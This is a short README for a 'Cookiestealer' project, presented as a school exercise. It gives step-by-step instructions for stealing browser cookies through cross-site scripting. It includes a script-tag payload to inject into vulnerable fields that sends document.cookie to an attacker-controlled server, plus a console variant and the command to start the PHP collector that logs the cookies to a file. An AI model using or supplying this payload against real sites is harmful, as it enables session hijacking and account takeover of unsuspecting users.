# Cookiestealer

Just a school project for learning. Don't use this for evil.

If `HttpOnly` is `false`, and XSS is enabled, it's possible to steal the cookies the following way:

## Start the server

```
$ php -S yourIP:yourPort
```

## Test locally

If running locally, you can steal the cookies by running

```
document.location= "http://127.0.0.1:3000/cookiestealer.php?c=" + document.cookie
```

in the console in developer tools.

## Embed in XSS, execute remotely

Put the following in a field vulnerable to XSS:

```
<script language="javascript"> image = new Image(); image.src="http://yourDomainOrIP:yourPort/cookiestealer.php?c="+document.cookie </script>
```

The cookies will then be saved to `cookielog.txt`.
